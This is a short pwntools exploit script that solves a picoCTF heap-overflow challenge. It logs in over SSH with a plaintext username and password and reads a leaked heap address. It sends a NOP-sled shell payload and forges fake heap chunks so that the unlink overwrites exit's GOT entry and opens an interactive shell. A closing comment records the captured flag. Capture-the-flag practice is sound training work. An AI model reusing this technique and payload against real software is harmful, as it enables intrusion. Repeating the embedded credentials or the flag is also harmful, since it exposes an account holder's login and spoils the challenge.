from pwn import *
import sys

if len(sys.argv) < 2:
	r = process('./heap_overflow')
else:
	s = ssh(host = '2019shell1.picoctf.com', user= "Linh169", password = "mylinh1006")
	r= s.process('./vuln', cwd = '/problems/heap-overflow_2_de0f6daa62288c9b3afb950888dc7166')
	
raw_input('debug')

r.recvuntil('decimal...')
res = r.recv(10)
leak = int(res)
print "%#x" %leak


exit_got = 0x804d02c
shellcode = 'a'*8
shellcode += asm('''
  jmp sc
  {}
sc:
  nop
  '''.format('nop\n'*100)+shellcraft.i386.linux.sh())

shellcode = shellcode.ljust(0x2a0-0x4)
shellcode += p32(0x49).ljust(0x48)
shellcode += p32(0x101)

r.sendlineafter('fullname\n', shellcode)


fake_chunk = p32(0x101)
fake_chunk += p32(exit_got-12) 
fake_chunk += p32(leak+8)
fake_chunk = fake_chunk.ljust(0x100-0x4)+p32(0x101)

payload = 'a'*(0x100-4)+fake_chunk

r.sendlineafter('lastname\n', payload)


r.interactive()
r.close()
# picoCTF{a_s1mpl3_h3ap_5e4b54d4}